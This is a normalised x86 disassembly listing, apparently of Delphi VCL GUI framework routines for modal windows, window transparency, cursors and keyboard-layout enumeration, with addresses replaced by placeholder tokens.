xor edx edx
call sub_41621c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45ff5c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_458ee8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45ed64
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45ea44
xor edx edx
push ebp
push sub_45ecc3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e9a4
call GetCapture
test eax eax
je r-xdata
mov eax [ ebx ]
call sub_461cac
mov eax [ ebx ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_448484
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ecca
mov eax [ ebp - 0x4 ]
call sub_45ea3c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45ecca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed6e
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45ff5c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45ff5c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_416198
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_416340
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_458f9c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2ec ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45ed94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ed94
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445248
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45ee04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45ed94
pop ecx
mov eax [ esi + 0x34 ]
call sub_453abc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_453acc
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45ee88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446874
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4038bc
sub_45eeac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4038bc
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45eedc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45eeac
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45eedc
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ef58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45eeac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45eeac
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45eedc
pop ecx
test al al
je r-xdata
sub_45efac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4038bc
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45efdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45efac
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45efdc
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f058
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45efac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45efac
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45efdc
pop ecx
test al al
je r-xdata
sub_45f0ac
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx esi
call sub_4161a0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44dfc4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45f100
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45f0ac
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4038bc
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f17c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41e934
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45f1b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_442248
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_442f30
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f200
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e2 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2e4 ]
push eax
mov eax ebx
call sub_448484
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_448484
push eax
call RedrawWindow
sub_45f354
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xdc ]
xor edx edx
mov eax ebx
call sub_45a154
mov dl 0x5
mov eax ebx
call sub_45bef4
mov dl 0x1
mov eax ebx
call sub_4470c4
mov dl 0x3
mov eax ebx
call sub_45c1f0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45f3bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45f493
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_446f84
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446df0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_441278
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_441cd8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40451c
mov eax [ ebp - 0xc ]
call sub_4046e4
push eax
mov eax [ ebp - 0xc ]
call sub_4048dc
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_441ce8
mov eax [ ebp - 0xc ]
call sub_4046e4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f49a
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov dl 0x1
mov eax esi
call sub_45b640
mov edx [ ebp - 0xc ]
mov eax esi
call sub_441d94
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404a68
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45f4c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_445284
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45ad64
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_445248
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4038bc
inc ebp
dec edi
jne r-xdata
sub_45f50c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_446f84
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45f538
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447774
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45f560
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45d940
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_446f84
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448484
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_448484
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_446f98
or ecx 0xffffffff
mov dl 0x1
call sub_442424
pop esi
pop ebx
retn
sub_45f5f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_447be4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_442f30
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_441704
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4038bc
sub_45f650
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45f716
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_441cd8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40451c
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_441ce8
mov eax [ ebp - 0x4 ]
call sub_4046e4
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_441d94
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f71d
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_45b640
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a68
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45f73c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_447964
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_446f84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_446f98
mov dl [ ebx + 0x57 ]
call sub_441c84
inc edi
dec esi
jne r-xdata
sub_45f7e0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45f810
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e1a4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45fbb4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45fbc0
mov eax ebx
call sub_45fbcc
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45c094
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45ffec
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45fec8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45fec8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45fec8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45f968
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4036c0
mov eax [ ebp + 0x88 ]
call sub_4036c0
mov eax [ ebp + 0x84 ]
call sub_4036c0
mov eax [ ebp + 0x54 ]
call sub_4036c0
mov eax [ ebp + 0x50 ]
call sub_4036c0
mov eax [ ebp + 0x4c ]
call sub_4036c0
mov eax [ ebp + 0x30 ]
call sub_4036c0
mov eax [ ebp + 0x34 ]
call sub_4036c0
mov eax [ ebp + 0x7c ]
call sub_4036c0
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4036c0
mov eax ebp
call sub_45fc28
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41e1f0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403a74
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4161a0
call sub_4036c0
inc edi
dec esi
jne r-xdata
sub_45fae0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45fb2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416044
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416044
mov eax [ rw-data ]
call sub_4627fc
sub_45fb64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416340
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_416340
mov eax [ rw-data ]
call sub_4627fc
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_449930
sub_45fbcc
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45fc84
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45fc28
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402764
mov ebx esi
test ebx ebx
jne r-xdata
sub_45fc84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_402744
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45fcac
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45fe57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe5e
lea eax [ ebp - 0x260 ]
call sub_40442c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_40442c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_418830
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_4096b0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44d094
test al al
je r-xdata
xor eax eax
push ebp
push sub_45fe13
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404694
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404694
sub_45fec8
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46266c
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462418
mov dl 0x1
mov eax [ rw-data ]
call sub_462418
sub_45ff34
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
